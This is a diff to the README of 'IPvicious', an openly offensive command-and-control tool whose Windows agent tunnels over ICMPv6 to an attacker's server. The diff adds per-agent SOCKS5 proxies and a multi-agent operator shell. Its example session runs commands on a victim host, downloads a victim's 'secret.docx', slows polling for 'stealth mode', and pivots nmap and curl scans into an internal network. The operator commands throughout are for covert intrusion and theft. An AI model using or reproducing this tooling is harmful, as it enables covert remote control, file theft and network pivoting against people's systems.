@@ -75,11 +75,12 @@ When a `-psk` is configured, every frame's `Data` field is **AES-256-GCM** authe
 | `STREAM_CLOSE` | `0x04` | Both | Close stream |
 | `CMD` | `0x05` | C2→Agent | Execute shell command |
 | `CMD_OUT` | `0x06` | Agent→C2 | Command output chunk |
-| `ACK` | `0x07` | Agent→C2 | End of command output |
-| `FILE_GET` | `0x08` | C2→Agent | Request file upload |
-| `FILE_PUT` | `0x09` | C2→Agent | Push file to agent |
-| `FILE_DATA` | `0x0A` | Both | File content chunk |
-| `FILE_END` | `0x0B` | Both | End of file transfer |
+| `FILE_GET` | `0x07` | C2→Agent | Request file upload (agent→C2) |
+| `FILE_PUT` | `0x08` | C2→Agent | Push file to agent (C2→agent) |
+| `FILE_DATA` | `0x09` | Both | File content chunk |
+| `FILE_END` | `0x0A` | Both | End of file transfer |
+| `ACK` | `0x0B` | Agent→C2 | End of command output |
+| `ERROR` | `0x0C` | Both | Error description (ASCII payload) |
 | `NOOP` | `0x0D` | Both | Empty poll / keepalive |
 | `SET_POLL` | `0x0E` | C2→Agent | Change poll interval |
 
@@ -147,11 +148,11 @@ capability to the binary after building:
 
 ```bash
 # Option A – run as root (simplest)
-sudo ./dist/c2server -socks 127.0.0.1:1080
+sudo ./dist/c2server
 
 # Option B – grant CAP_NET_RAW to the binary (no root required at runtime)
 sudo setcap cap_net_raw+ep dist/c2server
-./dist/c2server -socks 127.0.0.1:1080
+./dist/c2server
 ```
 
 #### 6. proxychains4 configuration (for using the SOCKS5 proxy)
@@ -208,17 +209,20 @@ go run ./tools/strenc "new string to encrypt"
 ### 1. Start the C2 server (attacker's host)
 
 ```bash
-# Interactive REPL (default)
-sudo ./c2server -socks 127.0.0.1:1080
+# Interactive REPL (default) — SOCKS5 proxies are started per-agent from the shell
+sudo ./c2server
+
+# Custom SOCKS5 base port (proxies will be allocated from 2080 upward)
+sudo ./c2server -socks-base 2080
 
 # With PSK encryption
-sudo ./c2server -socks 127.0.0.1:1080 -psk "my-secret-key"
+sudo ./c2server -psk "my-secret-key"
 
 # Headless mode (no terminal, callbacks only)
-sudo ./c2server -socks 127.0.0.1:1080 -no-repl
+sudo ./c2server -no-repl
 ```
 
-The SOCKS5 proxy listens on `127.0.0.1:1080`. Tunnel traffic is received on all interfaces via raw ICMPv6 (requires `root` or `CAP_NET_RAW`).
+Tunnel traffic is received on all interfaces via raw ICMPv6 (requires `root` or `CAP_NET_RAW`). SOCKS5 proxies are **not** started automatically — use the `socks` REPL command once an agent connects (see §4 below).
 
 ### 2. Deploy the agent (Windows workstation)
 
@@ -237,7 +241,14 @@ Agent requires **no administrator rights**. It uses `Icmp6SendEcho2` from `iphlp
 
 ### 3. Use the SOCKS5 proxy
 
-Point any SOCKS5-aware tool at `127.0.0.1:1080` on the C2 server:
+Start a proxy for the active agent from the REPL (`socks` auto-allocates a port, or specify one):
+
+```
+IPvicious[1]> socks          # binds 127.0.0.1:1080 (or next free port)
+IPvicious[1]> socks 1081     # specific port
+```
+
+Then point any SOCKS5-aware tool at the reported address:
 
 ```bash
 # Port scan internal network through the pivot
@@ -247,44 +258,66 @@ proxychains4 nmap -sT -Pn 10.0.0.0/24
 proxychains4 curl http://10.0.1.100/admin
 ```
 
+Each agent gets its own proxy on a distinct port. Use `stopsocks <addr>` to tear one down.
+
 ### 4. Interactive REPL
 
-Once the agent connects, the C2 server drops into an operator shell:
+Once agents connect, the C2 server drops into an operator shell. The prompt shows the active agent index (`IPvicious[N]>`), or `IPvicious>` when none is selected.
 
 ```
 IPvicious> help
-  help                     – show this message
-  status                   – agent session info (address, last seen, poll interval)
-  streams                  – list active relay streams
-  cmd    <command>         – execute a shell command on the agent
-  get    <remote> [local]  – download a file from the agent
-  put    <local> <remote>  – upload a file to the agent
-  sleep  <minutes>         – slow the agent poll (e.g. sleep 10)
-  wake   [ms]              – restore fast polling (default 50 ms)
-  close  <id>              – close a stream by ID
-  exit                     – quit the server
+  agents                       List all connected agents
+  select <n>                   Select active agent by index
+  status                       Active agent address + poll interval
+  streams                      List active relay streams for active agent
+  cmd    <command>             Execute shell command on active agent
+  get    <remote> [local]      Download file from active agent
+  put    <local>  <remote>     Upload file to active agent
+  socks  [port]                Start SOCKS5 proxy for active agent (auto-port if omitted)
+  stopsocks <addr>             Stop a SOCKS5 proxy by listen address
+  sleep  <minutes>             Slow active agent poll (stealth mode)
+  wake   [ms]                  Restore fast polling (default 50 ms)
+  close  <id>                  Close a relay stream by ID
+  exit                         Shut down C2 server
 ```
 
-**Example session:**
+**Example session (two agents):**
 
 ```
-IPvicious> status
+[+] new agent 2001:db8::42#1 (echo#1 from [2001:db8::42]:0)
+[+] new agent 2001:db8::43#1 (echo#1 from [2001:db8::43]:0)
+
+IPvicious[1]> agents
+  * [1] [2001:db8::42]:0  echo#1  poll=50 ms  last=12 ms ago  streams=0
+    [2] [2001:db8::43]:0  echo#1  poll=50 ms  last=31 ms ago  streams=0
+
+IPvicious[1]> status
   Address   : [2001:db8::42]:0
-  Last poll : 23 ms ago
-  Next poll : in 27 ms
+  Echo ID   : 1  (unique per agent.exe process)
+  Last poll : 14 ms ago
+  Next poll : in 36 ms
   Interval  : 50 ms
 
-IPvicious> cmd whoami /all
+IPvicious[1]> socks
+SOCKS5 proxy for agent 2001:db8::42#1 listening on 127.0.0.1:1080
+
+IPvicious[1]> select 2
+active agent → [2] 2001:db8::43#1
+
+IPvicious[2]> socks
+SOCKS5 proxy for agent 2001:db8::43#1 listening on 127.0.0.1:1081
+
+IPvicious[2]> cmd whoami /all
 [cmd output appears here]
 
-IPvicious> get C:\Users\victim\Desktop\secret.docx /tmp/secret.docx
-[download complete: 24576 bytes]
+IPvicious[2]> get C:\Users\victim\Desktop\secret.docx
+[+] download complete: secret.docx (24576 bytes, 1.2s)
 
-IPvicious> sleep 10
-poll interval set to 10 min (agent will respond slowly until wake)
+IPvicious[2]> sleep 10
+agent poll slowed to 10 min (stealth mode)
 
-IPvicious> wake
-poll interval set to 50 ms
+IPvicious[2]> wake
+agent poll set to 50 ms
 ```
 
 ---
@@ -293,9 +326,10 @@ poll interval set to 50 ms
 
 | Parameter | Default | Description |
 |-----------|---------|-------------|
-| `-poll` / `defaultPollMs` | `50` ms | ICMPv6 poll interval |
-| `-socks` / `defaultSocksAddr` | `127.0.0.1:1080` | SOCKS5 listen address |
+| `-poll` / `defaultPollMs` | `50` ms | ICMPv6 poll interval (agent) |
+| `-socks-base` / `defaultSocksBase` | `1080` | First TCP port for per-agent SOCKS5 proxies (server) |
 | `-psk` / `defaultPSK` | *(disabled)* | AES-256-GCM pre-shared key (must match on both ends) |
+| `socks [port]` REPL command | auto | Start a SOCKS5 proxy for the active agent |
 | `sleep <min>` REPL command | — | Slow poll when agent is idle |
 | `wake [ms]` REPL command | `50` ms | Restore fast poll on demand |
 
